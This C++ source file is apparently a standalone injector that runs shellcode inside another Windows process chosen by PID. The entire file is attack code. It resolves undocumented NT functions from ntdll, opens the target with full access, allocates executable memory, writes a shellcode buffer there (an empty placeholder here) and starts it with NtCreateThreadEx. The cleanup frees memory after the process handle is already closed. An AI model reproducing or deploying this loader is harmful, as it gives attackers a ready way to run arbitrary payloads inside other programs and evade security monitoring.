#include <iostream>
#include "NTAPIs.h"

int main() {

    unsigned char shellcode[] = {0};

    SIZE_T shellcode_size = sizeof(shellcode);

    HANDLE          hProcess {},
                    hThread  {};

    HMODULE         hNtdll   {};

    PVOID           buffer   {};
    DWORD           pid      {};
    NT::CLIENT_ID   CID      {.UniqueThread = NULL};
    NT::NTSTATUS    STATUS   {};

    std::cout << "What is the pid: ";
    std::cin >> pid;

    CID.UniqueProcess = (HANDLE)pid;

    hNtdll = GetModuleHandleA("ntdll");
    NT::NtAllocateVirtualMemory NtVirtualAllocate       = (NT::NtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
    NT::NtWaitForSingleObject   NtWaitForSingleObject   = (NT::NtWaitForSingleObject)GetProcAddress(hNtdll, "NtWaitForSingleObject");
    NT::NtWriteVirtualMemory    NtWriteProcessMemory    = (NT::NtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
    NT::NtFreeVirtualMemory     NtFreeVirtualMemory     = (NT::NtFreeVirtualMemory)GetProcAddress(hNtdll, "NtFreeVirtualMemory");
    NT::NtCreateThreadEx        NtCreateThreadEx        = (NT::NtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");
    NT::NtOpenProcess           NtOpenProcess           = (NT::NtOpenProcess)GetProcAddress(hNtdll, "NtOpenProcess");
    NT::NtClose                 NtCLOSE                 = (NT::NtClose)GetProcAddress(hNtdll, "NtClose");


    NT::OBJECT_ATTRIBUTES ObjectAttributes{};
    InitializeObjectAttributes(&ObjectAttributes,NULL,NULL,NULL,NULL);
    STATUS = NtOpenProcess(&hProcess,
        PROCESS_ALL_ACCESS,
        &ObjectAttributes,
        &CID);

    if (!NT_SUCCESS(STATUS)) {
        std::cout << "Error opening process" << '\n';
        return 1;
    }
    std::cout << "Opened Process\n";

    STATUS = NtVirtualAllocate(
        hProcess,
        &buffer,
        0,
        &shellcode_size,
        (MEM_COMMIT | MEM_RESERVE),
        PAGE_EXECUTE_READWRITE);

    if (!NT_SUCCESS(STATUS)) {
        std::cout << "Error allocating memory" << '\n';
        return 1;
    }
    std::cout << "Allocated memory\n";

    SIZE_T BytesWritten{};
    STATUS = NtWriteProcessMemory(hProcess,buffer,shellcode,sizeof(shellcode),&BytesWritten);

    if (!NT_SUCCESS(STATUS)) {
        std::cout << "Error writing to memory" << '\n';
        std::cout << "Shellcode written to memory " << BytesWritten << '\n';
        return 1;
    }
    std::cout << "Shellcode written to memory " << BytesWritten << '\n';

    NT::PUSER_THREAD_START_ROUTINE StartRoutine{(NT::PUSER_THREAD_START_ROUTINE)buffer};

    STATUS = NtCreateThreadEx (
        &hThread,
        THREAD_ALL_ACCESS,
        &ObjectAttributes,
        hProcess,
        StartRoutine,
        NULL,
        0,
        0,
        0,
        0,
        NULL);


    if (!NT_SUCCESS(STATUS)) {
        std::cout << "Error creating thread" << '\n';
        return 1;
    }
    std::cout << "Created thread\n";

    LARGE_INTEGER liTimeout{INFINITE};
    NtWaitForSingleObject(hThread,FALSE,&liTimeout);

    std::cout << "Cleaning up\n";
    NtCLOSE(hThread);
    NtCLOSE(hProcess);
    NtFreeVirtualMemory(
        hProcess,
        &buffer,
        &shellcode_size,
        MEM_RELEASE);

    std::cout << "Done :)\n";

    return 0;
}
